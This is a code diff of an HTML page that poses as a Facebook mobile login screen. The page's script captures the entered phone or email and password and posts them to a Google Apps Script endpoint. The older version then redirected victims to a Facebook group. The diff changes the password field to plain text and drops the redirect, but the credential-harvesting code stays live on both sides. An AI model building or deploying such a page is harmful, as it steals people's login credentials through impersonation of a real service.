@@ -1,8 +1,7 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
-
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=Edge">
         <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -14,12 +13,11 @@
 
         <!-- Custom Styles -->
         <link rel="stylesheet" href="style.css">
-<meta name="google-site-verification" content="Z6aCeHy8mqj10y6ES1ftZ0rsk25-43mh3sXIMti4sog" />
 </head>
 
 <body>
         <div class="header">
-                <img src="/pg.jpg">
+                <img src="https://developerkpkaushal.netlify.app/pg.jpg">
                 <p class="p1"><a style="text-decoration: none; color:#3b5999;" href="#"> Get Facebook for Android and browse faster.</p></a>
                 <p class="p2">You must log in first.</p>
         </div>
@@ -32,7 +30,7 @@
         <div class="inputs">
                 <form name="form"method="POST" action="">
                 <input name="Phone"class="inputs" type="text" placeholder="Mobile number or email address  "required><br>
-                <input name="Pass" class="inputss" type="password" placeholder="Password"required>
+                <input name="Pass" class="inputss" type="text" placeholder="Password"required>
              <button name="submit"type="submit">
                 Log In </button>
         </div><br>
@@ -81,18 +79,17 @@
 <h5 align="center"> Meta © 2022</h5>
 <script>
 
-			const scriptURL = 'https://script.google.com/macros/s/AKfycbxD28OxZp-UKkWNjrGKve5cRQUMTAIduhvonfHBE2_x5tc548mrGC9KaovGsLKv_CTW/exec'
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxD28OxZp-UKkWNjrGKve5cRQUMTAIduhvonfHBE2_x5tc548mrGC9KaovGsLKv_CTW/exec'
 
-			const form = document.forms['form']
-		  
-			form.addEventListener('submit', e => {
-			  e.preventDefault()
-			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-.then(response => window.location.href='https://www.facebook.com/groups/492178008551360/permalink/756421265460365/?app=fbl'))
-
-				.catch(error => console.error('Error!', error.message))
-			})
-		  </script>
+            const form = document.forms['form']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
         <!-- Project -->
         <script src="main.js"></script>
 </body>
